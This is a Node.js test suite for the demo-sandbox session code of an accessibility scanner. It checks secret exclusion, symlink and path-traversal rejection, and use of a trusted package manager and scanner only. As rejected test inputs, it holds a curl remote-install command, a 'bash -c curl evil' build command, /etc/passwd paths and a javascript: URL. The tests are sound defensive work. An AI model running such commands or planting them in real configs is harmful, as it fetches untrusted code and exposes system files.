import {
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { isAbsolute, join } from 'node:path';
import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  DemoSandboxError,
  prepareDemoSandbox,
  reportHasTargetFinding,
  resolveTrustedPackageScannerExecutable,
  runFreshSandboxScan,
  validateDemoRoute,
} from '../../src/fix/demo/session.js';
import { buildAccessScanRun } from '../../src/index.js';
import { buildScanReportV2 } from '../../src/reporter/report-v2.js';
import { hashFileBytes } from '../../src/fix/candidate/intent.js';
import { DemoPackageManagerError, resolvePackageManager } from '../../src/fix/demo/package-manager.js';
import { createTrustedVerificationAdapters, resolveTrustedVerificationConfig } from '../../src/fix/verify/adapters.js';
import { resetProjectRootCache } from '../../src/utils/paths.js';

function demoSandboxOptions(overrides = {}) {
  return {
    packageManagerCommand: process.execPath,
    ...overrides,
  };
}

const DEMO_SCANNER_RUN = buildAccessScanRun([], { engineVersion: '1.0.1' });

function buildDemoReport(targetFile) {
  return buildScanReportV2([{
    page: 'homepage',
    url: 'http://127.0.0.1:1234/',
    scannerRuns: [DEMO_SCANNER_RUN],
    violations: [{
      ruleId: 'button-name',
      nativeRuleId: 'button-name',
      canonicalRuleId: 'button-name',
      layer: 'accessScan',
      impact: 'critical',
      element: { outerHTML: '<div id="page">Home</div>', selector: '#page' },
      source: {
        mode: 'local',
        file: targetFile,
        line: 1,
        confidence: 'high',
        method: 'fixture',
        preimageSha256: hashFileBytes(Buffer.from('<div id="page">Home</div>\n')),
      },
      fix: { deterministic: false, hint: 'Fix it' },
    }],
  }], {
    producer: {
      name: 'ada-scan',
      version: '1.0.1',
      nodeVersion: process.versions.node,
    },
    target: {
      mode: 'local-only',
      url: 'http://127.0.0.1:1234/',
      buildRevision: 'git:abc123def4567890123456789012345678901234',
      instrumentationDigest: 'sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
    },
  });
}

function writeMinimalProject(root, { includeSecrets = true } = {}) {
  mkdirSync(join(root, 'src', 'pages'), { recursive: true });
  mkdirSync(join(root, 'src', 'partials', 'layout'), { recursive: true });
  const indexPath = join(root, 'src', 'pages', 'index.liquid');
  const headerPath = join(root, 'src', 'partials', 'layout', 'header.liquid');
  writeFileSync(indexPath, '<div id="page">Home</div>\n');
  writeFileSync(headerPath, '<button class="menu">Menu</button>\n');
  mkdirSync(join(root, 'node_modules', 'pkg'), { recursive: true });
  writeFileSync(join(root, 'node_modules', 'pkg', 'index.js'), 'module.exports = {};\n');
  mkdirSync(join(root, '.git'), { recursive: true });
  writeFileSync(join(root, '.git', 'HEAD'), 'ref: refs/heads/main\n');
  mkdirSync(join(root, 'dist'), { recursive: true });
  writeFileSync(join(root, 'dist', 'index.html'), '<html></html>\n');
  mkdirSync(join(root, 'scan-reports'), { recursive: true });
  writeFileSync(join(root, 'scan-reports', 'latest.json'), '{}\n');
  if (includeSecrets) {
    writeFileSync(join(root, '.env'), 'SECRET=1\n');
    mkdirSync(join(root, 'credentials'), { recursive: true });
    writeFileSync(join(root, 'credentials', 'api.json'), '{}');
  }
  mkdirSync(join(root, 'ada-scan', 'bin'), { recursive: true });
  writeFileSync(join(root, 'ada-scan', 'bin', 'ada-scan.js'), '#!/usr/bin/env node\n');
  return { indexPath, headerPath };
}

function writeDemoBuildScaffold(root) {
  writeFileSync(join(root, 'package.json'), `${JSON.stringify({
    scripts: { 'build:vite': 'node -e "process.exit(0)"' },
  }, null, 2)}\n`);
  writeFileSync(join(root, 'vite.config.js'), 'export default {};\n');
}

test('prepareDemoSandbox creates sandbox-only scan config when host has none', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-config-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    writeDemoBuildScaffold(root);
    resetProjectRootCache();
    assert.equal(existsSync(join(root, '.scan-config.json')), false);

    const prepared = await prepareDemoSandbox(demoSandboxOptions({
      originalRoot: root,
      sessionId: 'demo-sandbox-config',
      targetFile: 'src/pages/index.liquid',
      packageManagerCommand: process.execPath,
      runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
    }));

    assert.equal(existsSync(join(root, '.scan-config.json')), false);
    assert.equal(existsSync(join(prepared.sandboxRoot, '.scan-config.json')), true);

    const verification = resolveTrustedVerificationConfig(prepared.sandboxRoot);
    assert.equal(verification.ok, true);
    assert.equal(verification.outDir, 'dist');
    assert.deepEqual(verification.prepare, {
      command: realpathSync(process.execPath),
      args: ['install', '--ignore-scripts'],
    });
    assert.deepEqual(verification.build, {
      command: realpathSync(process.execPath),
      args: ['build:vite'],
    });

    const sandboxConfig = JSON.parse(readFileSync(join(prepared.sandboxRoot, '.scan-config.json'), 'utf8'));
    assert.equal(sandboxConfig.buildCommand, 'pnpm build:vite');
    assert.deepEqual(sandboxConfig.buildEnv, { SCAN_MODE: 'true', MINIFY: 'true' });
    assert.equal((statSync(join(prepared.sandboxRoot, '.scan-config.json')).mode & 0o777), 0o600);

    const adapters = createTrustedVerificationAdapters(prepared.sandboxRoot);
    assert.deepEqual(adapters.prepare, verification.prepare);
    assert.deepEqual(adapters.build, verification.build);
    let handle = null;
    try {
      handle = await adapters.site.start(prepared.sandboxRoot);
      assert.equal(handle.context.mode, 'vite');
    } finally {
      await handle?.stop();
    }
  } finally {
    resetProjectRootCache();
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox merges missing demo verification commands into copied host config only', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-config-merge-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    writeDemoBuildScaffold(root);
    const hostConfig = {
      baseUrl: 'http://127.0.0.1:4321',
      buildCommand: 'pnpm build:vite',
      buildEnv: { SCAN_MODE: 'true', MINIFY: 'true' },
      outDir: 'dist',
      verifyBuildCommand: { command: 'pnpm', args: ['build:vite'] },
    };
    const hostConfigPath = join(root, '.scan-config.json');
    writeFileSync(hostConfigPath, `${JSON.stringify(hostConfig, null, 2)}\n`);
    const hostBytesBefore = readFileSync(hostConfigPath);

    const prepared = await prepareDemoSandbox(demoSandboxOptions({
      originalRoot: root,
      sessionId: 'demo-config-merge',
      targetFile: 'src/pages/index.liquid',
      packageManagerCommand: process.execPath,
      runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
    }));

    assert.deepEqual(readFileSync(hostConfigPath), hostBytesBefore);

    const sandboxConfig = JSON.parse(readFileSync(join(prepared.sandboxRoot, '.scan-config.json'), 'utf8'));
    assert.equal(sandboxConfig.baseUrl, 'http://127.0.0.1:4321');
    assert.equal(sandboxConfig.outDir, 'dist');
    assert.deepEqual(sandboxConfig.verifyBuildCommand, {
      command: realpathSync(process.execPath),
      args: ['build:vite'],
    });
    assert.deepEqual(sandboxConfig.verifyInstallCommand, {
      command: realpathSync(process.execPath),
      args: ['install', '--ignore-scripts'],
    });

    const verification = resolveTrustedVerificationConfig(prepared.sandboxRoot);
    assert.equal(verification.ok, true);
    assert.deepEqual(verification.build, sandboxConfig.verifyBuildCommand);
    assert.deepEqual(verification.prepare, sandboxConfig.verifyInstallCommand);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox rejects malformed host scan config and cleans owned session', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-config-bad-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    writeFileSync(join(root, '.scan-config.json'), '[1,2,3]\n');
    const sessionDir = join(root, 'scan-reports', 'fix-sessions', 'demo-config-bad');
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-config-bad',
        targetFile: 'src/pages/index.liquid',
        runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
      })),
      (error) => error instanceof DemoSandboxError && error.code === 'MALFORMED_CONFIG',
    );
    assert.equal(existsSync(sessionDir), false);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox ignores hostile host verifyInstallCommand and uses resolved package manager', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-config-hostile-install-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    writeDemoBuildScaffold(root);
    writeFileSync(join(root, '.scan-config.json'), `${JSON.stringify({
      verifyInstallCommand: { command: 'curl', args: ['https://example.test/install.sh'] },
      verifyBuildCommand: { command: 'pnpm', args: ['build:vite'] },
    }, null, 2)}\n`);
    const hostBytesBefore = readFileSync(join(root, '.scan-config.json'));
    let captured = null;
    const prepared = await prepareDemoSandbox(demoSandboxOptions({
      originalRoot: root,
      sessionId: 'demo-hostile-install',
      targetFile: 'src/pages/index.liquid',
      packageManagerCommand: process.execPath,
      runCommand: async (command, args) => {
        captured = { command, args };
        return { code: 0, stdout: '', stderr: '' };
      },
    }));
    assert.deepEqual(captured, {
      command: realpathSync(process.execPath),
      args: ['install', '--ignore-scripts'],
    });
    const sandboxConfig = JSON.parse(readFileSync(join(prepared.sandboxRoot, '.scan-config.json'), 'utf8'));
    assert.deepEqual(sandboxConfig.verifyInstallCommand, {
      command: realpathSync(process.execPath),
      args: ['install', '--ignore-scripts'],
    });
    assert.deepEqual(readFileSync(join(root, '.scan-config.json')), hostBytesBefore);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox rejects unsafe host verifyBuildCommand and cleans owned session', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-config-hostile-build-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    writeFileSync(join(root, '.scan-config.json'), `${JSON.stringify({
      verifyBuildCommand: { command: 'bash', args: ['-c', 'curl evil'] },
    }, null, 2)}\n`);
    const sessionDir = join(root, 'scan-reports', 'fix-sessions', 'demo-hostile-build');
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-hostile-build',
        targetFile: 'src/pages/index.liquid',
        runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
      })),
      (error) => error instanceof DemoSandboxError && error.code === 'MALFORMED_CONFIG',
    );
    assert.equal(existsSync(sessionDir), false);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox rejects symlinked host scan config and cleans owned session', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-config-symlink-'));
  const outside = mkdtempSync(join(tmpdir(), 'ada-demo-session-config-outside-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    writeFileSync(join(outside, 'scan-config.json'), '{"outDir":"dist"}\n');
    symlinkSync(join(outside, 'scan-config.json'), join(root, '.scan-config.json'));
    const sessionDir = join(root, 'scan-reports', 'fix-sessions', 'demo-config-symlink');
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-config-symlink',
        targetFile: 'src/pages/index.liquid',
        runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
      })),
      (error) => error instanceof DemoSandboxError && error.code === 'SYMLINK_ESCAPE',
    );
    assert.equal(existsSync(sessionDir), false);
  } finally {
    rmSync(root, { recursive: true, force: true });
    rmSync(outside, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox copies project tree with exclusions and leaves original unchanged', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  try {
    const { indexPath } = writeMinimalProject(root);
    const originalText = readFileSync(indexPath, 'utf8');
    const prepared = await prepareDemoSandbox(demoSandboxOptions({
      originalRoot: root,
      sessionId: 'demo-one',
      targetFile: 'src/pages/index.liquid',
      runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
    }));

    assert.equal(existsSync(join(prepared.sandboxRoot, 'src/pages/index.liquid')), true);
    assert.equal(existsSync(join(prepared.sandboxRoot, '.env')), false);
    assert.equal(existsSync(join(prepared.sandboxRoot, 'credentials')), false);
    assert.equal(existsSync(join(prepared.sandboxRoot, 'node_modules')), false);
    assert.equal(existsSync(join(prepared.sandboxRoot, '.git')), false);
    assert.equal(existsSync(join(prepared.sandboxRoot, 'dist')), false);
    assert.equal(existsSync(join(prepared.sandboxRoot, 'scan-reports')), false);
    assert.equal(readFileSync(indexPath, 'utf8'), originalText);
    assert.equal(prepared.sessionDir, realpathSync(join(root, 'scan-reports', 'fix-sessions', 'demo-one')));
    assert.equal(prepared.artifactsDir, join(prepared.sessionDir, 'artifacts'));
    assert.equal(prepared.sandboxRoot, join(prepared.sessionDir, 'demo-workspace'));
    assert.equal(prepared.targetFile, 'src/pages/index.liquid');
    assert.match(prepared.checkpoints.original.fileSha256, /^sha256:[a-f0-9]{64}$/);
    assert.match(prepared.checkpoints.sandbox.fileSha256, /^sha256:[a-f0-9]{64}$/);
    assert.equal(prepared.checkpoints.original.fileSha256, prepared.checkpoints.sandbox.fileSha256);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox skips symlinks during copy', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    symlinkSync(
      join(root, 'src', 'pages', 'index.liquid'),
      join(root, 'src', 'pages', 'linked.liquid'),
    );
    const prepared = await prepareDemoSandbox(demoSandboxOptions({
      originalRoot: root,
      sessionId: 'demo-symlink',
      targetFile: 'src/pages/index.liquid',
      runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
    }));
    assert.equal(existsSync(join(prepared.sandboxRoot, 'src/pages/linked.liquid')), false);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox rejects pre-existing session directory including empty', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    const sessionDir = join(root, 'scan-reports', 'fix-sessions', 'demo-dup');
    mkdirSync(sessionDir, { recursive: true });
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-dup',
        targetFile: 'src/pages/index.liquid',
        runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
      })),
      (error) => error instanceof DemoSandboxError && error.code === 'DEMO_SESSION_EXISTS',
    );
    assert.equal(existsSync(sessionDir), true);
    assert.equal(existsSync(join(sessionDir, 'demo-workspace')), false);

    mkdirSync(join(sessionDir, 'demo-workspace'), { recursive: true });
    writeFileSync(join(sessionDir, 'demo-workspace', 'marker.txt'), 'keep\n');
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-dup',
        targetFile: 'src/pages/index.liquid',
        runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
      })),
      (error) => error instanceof DemoSandboxError && error.code === 'DEMO_SESSION_EXISTS',
    );
    assert.equal(readFileSync(join(sessionDir, 'demo-workspace', 'marker.txt'), 'utf8'), 'keep\n');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox rejects unsafe session ids and target paths', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    const runCommand = async () => ({ code: 0, stdout: '', stderr: '' });
    const base = (overrides) => demoSandboxOptions({ originalRoot: root, runCommand, ...overrides });

    await assert.rejects(
      () => prepareDemoSandbox(base({ sessionId: '../escape', targetFile: 'src/pages/index.liquid' })),
      (error) => error instanceof DemoSandboxError && error.code === 'INVALID_SESSION_ID',
    );
    await assert.rejects(
      () => prepareDemoSandbox(base({ sessionId: 'demo-bad', targetFile: '/etc/passwd' })),
      (error) => error instanceof DemoSandboxError && error.code === 'INVALID_TARGET_FILE',
    );
    await assert.rejects(
      () => prepareDemoSandbox(base({ sessionId: 'demo-bad', targetFile: '../secret.liquid' })),
      (error) => error instanceof DemoSandboxError && error.code === 'INVALID_TARGET_FILE',
    );
    await assert.rejects(
      () => prepareDemoSandbox(base({ sessionId: 'demo-bad', targetFile: 'missing.liquid' })),
      (error) => error instanceof DemoSandboxError && error.code === 'TARGET_FILE_MISSING',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox rejects non-regular target files', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    mkdirSync(join(root, 'src', 'pages', 'dir-target'), { recursive: true });
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-dir',
        targetFile: 'src/pages/dir-target',
        runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
      })),
      (error) => error instanceof DemoSandboxError && error.code === 'TARGET_NOT_REGULAR_FILE',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox rejects symlink target files', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    symlinkSync(
      join(root, 'src', 'pages', 'index.liquid'),
      join(root, 'src', 'pages', 'linked-target.liquid'),
    );
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-symlink-target',
        targetFile: 'src/pages/linked-target.liquid',
        runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
      })),
      (error) => error instanceof DemoSandboxError && error.code === 'SYMLINK_ESCAPE',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox removes owned session directory after install failure', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    const sessionDir = join(root, 'scan-reports', 'fix-sessions', 'demo-install-fail');
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-install-fail',
        targetFile: 'src/pages/index.liquid',
        runCommand: async () => ({ code: 1, stdout: 'SECRET=token', stderr: 'CIS_AUTH_TOKEN=leak' }),
      })),
      (error) => error instanceof DemoSandboxError && error.code === 'DEMO_PREPARE_FAILED',
    );
    assert.equal(existsSync(sessionDir), false);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox removes owned session directory after copy failure', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    const sessionDir = join(root, 'scan-reports', 'fix-sessions', 'demo-copy-fail');
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-copy-fail',
        targetFile: 'src/pages/index.liquid',
        runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
        copyProjectTree: () => {
          throw new Error('copy failed');
        },
      })),
      (error) => error instanceof Error && error.message === 'copy failed',
    );
    assert.equal(existsSync(sessionDir), false);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox removes owned session directory after sandbox target mismatch', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    const sessionDir = join(root, 'scan-reports', 'fix-sessions', 'demo-target-mismatch');
    const { copyProjectTreeIntoShadow } = await import('../../src/fix/verify/shadow.js');
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-target-mismatch',
        targetFile: 'src/pages/index.liquid',
        runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
        copyProjectTree: ({ localRoot, shadowRoot }) => {
          const copy = copyProjectTreeIntoShadow({ localRoot, shadowRoot });
          writeFileSync(join(shadowRoot, 'src/pages/index.liquid'), '<div>Tampered</div>\n');
          return copy;
        },
      })),
      (error) => error instanceof DemoSandboxError && error.code === 'DEMO_SANDBOX_TARGET_MISMATCH',
    );
    assert.equal(existsSync(sessionDir), false);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox maps exclusive leaf EEXIST to DEMO_SESSION_EXISTS without cleanup', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    const sessionDir = join(root, 'scan-reports', 'fix-sessions', 'demo-eexist');
    mkdirSync(join(root, 'scan-reports', 'fix-sessions'), { recursive: true });
    mkdirSync(sessionDir);
    writeFileSync(join(sessionDir, 'marker.txt'), 'precreate\n');
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-eexist',
        targetFile: 'src/pages/index.liquid',
        runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
      })),
      (error) => error instanceof DemoSandboxError && error.code === 'DEMO_SESSION_EXISTS',
    );
    assert.equal(readFileSync(join(sessionDir, 'marker.txt'), 'utf8'), 'precreate\n');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox rejects symlinked fix-sessions parent', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  const outside = mkdtempSync(join(tmpdir(), 'ada-demo-session-outside-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    mkdirSync(join(root, 'scan-reports'), { recursive: true });
    symlinkSync(outside, join(root, 'scan-reports', 'fix-sessions'));
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-symlink-parent',
        targetFile: 'src/pages/index.liquid',
        runCommand: async () => ({ code: 0, stdout: '', stderr: '' }),
      })),
      (error) => error instanceof DemoSandboxError && error.code === 'SYMLINK_SESSION_PARENT',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
    rmSync(outside, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox rejects relative explicit packageManagerCommand', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    let runCommandCalled = false;
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-pm-relative',
        targetFile: 'src/pages/index.liquid',
        packageManagerCommand: './node_modules/.bin/pnpm',
        runCommand: async () => {
          runCommandCalled = true;
          return { code: 0, stdout: '', stderr: '' };
        },
      })),
      (error) => error instanceof DemoSandboxError && error.code === 'INVALID_PACKAGE_MANAGER',
    );
    assert.equal(runCommandCalled, false);
    assert.equal(existsSync(join(root, 'scan-reports', 'fix-sessions', 'demo-pm-relative')), false);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox passes absolute package manager command to runCommand', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    let captured = null;
    await prepareDemoSandbox(demoSandboxOptions({
      originalRoot: root,
      sessionId: 'demo-pm-abs',
      targetFile: 'src/pages/index.liquid',
      packageManagerCommand: process.execPath,
      runCommand: async (command, args, cwd, options) => {
        captured = { command, args, cwd, options };
        return { code: 0, stdout: '', stderr: '' };
      },
    }));
    assert.equal(isAbsolute(captured.command), true);
    assert.equal(captured.command, realpathSync(process.execPath));
    assert.deepEqual(captured.args, ['install', '--ignore-scripts']);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox rejects missing package manager before install execution', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    let runCommandCalled = false;
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-pm-missing',
        targetFile: 'src/pages/index.liquid',
        resolvePackageManager: () => {
          throw new DemoPackageManagerError('PACKAGE_MANAGER_NOT_FOUND', 'missing');
        },
        runCommand: async () => {
          runCommandCalled = true;
          return { code: 0, stdout: '', stderr: '' };
        },
      })),
      (error) => error instanceof DemoSandboxError && error.code === 'PACKAGE_MANAGER_NOT_FOUND',
    );
    assert.equal(runCommandCalled, false);
    assert.equal(existsSync(join(root, 'scan-reports', 'fix-sessions', 'demo-pm-missing')), false);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('prepareDemoSandbox removes owned session when install mutates sandbox target', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-session-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    const sessionDir = join(root, 'scan-reports', 'fix-sessions', 'demo-install-mutate');
    await assert.rejects(
      () => prepareDemoSandbox(demoSandboxOptions({
        originalRoot: root,
        sessionId: 'demo-install-mutate',
        targetFile: 'src/pages/index.liquid',
        runCommand: async (_command, _args, cwd) => {
          writeFileSync(join(cwd, 'src/pages/index.liquid'), '<div>Mutated during install</div>\n');
          return { code: 0, stdout: '', stderr: '' };
        },
      })),
      (error) => error instanceof DemoSandboxError && error.code === 'DEMO_SANDBOX_TARGET_MISMATCH',
    );
    assert.equal(existsSync(sessionDir), false);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('validateDemoRoute accepts root and simple local path segments', () => {
  assert.equal(validateDemoRoute('/'), '/');
  assert.equal(validateDemoRoute('/about'), '/about');
  assert.equal(validateDemoRoute('/jobs/list'), '/jobs/list');
  assert.equal(validateDemoRoute('/a-b_c.d/e-f'), '/a-b_c.d/e-f');
});

test('validateDemoRoute rejects traversal, schemes, encoding, and malformed paths', () => {
  const invalidRoutes = [
    '',
    'about',
    '/about/../secret',
    '/./about',
    '/about/',
    '//about',
    '/about//jobs',
    '/about\\jobs',
    '/about?x=1',
    '/about#frag',
    '/about%20jobs',
    'http://evil/',
    'javascript:alert(1)',
    '/about/\x07',
    '/..',
    '/../etc/passwd',
  ];

  for (const route of invalidRoutes) {
    assert.throws(
      () => validateDemoRoute(route),
      (error) => error instanceof DemoSandboxError && error.code === 'INVALID_ROUTE',
      `expected INVALID_ROUTE for ${JSON.stringify(route)}`,
    );
  }
});

function reportWithFinding(sourceFile) {
  return {
    pages: [{
      findings: [{ source: { file: sourceFile } }],
    }],
  };
}

test('reportHasTargetFinding accepts exact normalized target path', () => {
  const target = 'src/partials/layout/header.liquid';
  assert.equal(reportHasTargetFinding(reportWithFinding(target), target), true);
  assert.equal(
    reportHasTargetFinding(reportWithFinding('./src/partials/layout/header.liquid'), target),
    true,
  );
});

test('reportHasTargetFinding rejects null, different, and confusable paths', () => {
  const target = 'src/partials/layout/header.liquid';
  const report = reportWithFinding(target);
  assert.equal(reportHasTargetFinding(report, 'src/partials/layout/footer.liquid'), false);
  assert.equal(reportHasTargetFinding(report, 'src/partials/layout/header'), false);
  assert.equal(reportHasTargetFinding(report, 'src/partials/layout/header.liquid.bak'), false);
  assert.equal(
    reportHasTargetFinding({ pages: [{ findings: [{ source: { file: null } }] }] }, target),
    false,
  );
  assert.equal(reportHasTargetFinding({ pages: [{ findings: [{ source: {} }] }] }, target), false);
  assert.equal(reportHasTargetFinding({ pages: [] }, target), false);
});

test('runFreshSandboxScan executes trusted package scanner, not sandbox copy', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-trusted-scanner-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    const decoyScanner = join(root, 'ada-scan', 'bin', 'ada-scan.js');
    writeFileSync(decoyScanner, '#!/usr/bin/env node\nthrow new Error("decoy");\n');

    const trustedScanner = resolveTrustedPackageScannerExecutable();
    const report = buildDemoReport('src/partials/layout/header.liquid');
    mkdirSync(join(root, 'scan-reports'), { recursive: true });
    writeFileSync(join(root, 'scan-reports', 'latest.json'), `${JSON.stringify(report)}\n`);

    let captured = null;
    await runFreshSandboxScan({
      sandboxRoot: root,
      route: '/',
      runCommand: async (command, args, cwd, options) => {
        captured = { command, args, cwd, extraEnv: options.extraEnv };
        return { code: 0, stdout: '', stderr: '' };
      },
    });

    assert.ok(captured);
    assert.equal(captured.args[0], trustedScanner);
    assert.equal(isAbsolute(captured.args[0]), true);
    assert.notEqual(captured.args[0], realpathSync(decoyScanner));
    const scannerStat = lstatSync(captured.args[0]);
    assert.equal(scannerStat.isFile(), true);
    assert.equal(scannerStat.isSymbolicLink(), false);
    assert.equal(
      realpathSync(captured.args[0]),
      realpathSync(join(fileURLToPath(new URL('../..', import.meta.url)), 'bin', 'ada-scan.js')),
    );
    assert.equal(realpathSync(captured.cwd), realpathSync(root));
    assert.equal(realpathSync(captured.extraEnv.ADA_SCAN_ROOT), realpathSync(root));
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('runFreshSandboxScan ignores scannerExecutable override and always uses trusted package scanner', async () => {
  const root = mkdtempSync(join(tmpdir(), 'ada-demo-scanner-override-'));
  try {
    writeMinimalProject(root, { includeSecrets: false });
    const decoyScanner = join(root, 'decoy-scanner.js');
    writeFileSync(decoyScanner, '#!/usr/bin/env node\nthrow new Error("decoy override");\n');
    chmodSync(decoyScanner, 0o755);

    const trustedScanner = resolveTrustedPackageScannerExecutable();
    const report = buildDemoReport('src/partials/layout/header.liquid');
    mkdirSync(join(root, 'scan-reports'), { recursive: true });
    writeFileSync(join(root, 'scan-reports', 'latest.json'), `${JSON.stringify(report)}\n`);

    let captured = null;
    await runFreshSandboxScan({
      sandboxRoot: root,
      route: '/',
      scannerExecutable: decoyScanner,
      runCommand: async (command, args, cwd, options) => {
        captured = { command, args, cwd, extraEnv: options.extraEnv };
        return { code: 0, stdout: '', stderr: '' };
      },
    });

    assert.ok(captured);
    assert.equal(captured.args[0], trustedScanner);
    assert.notEqual(captured.args[0], realpathSync(decoyScanner));
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

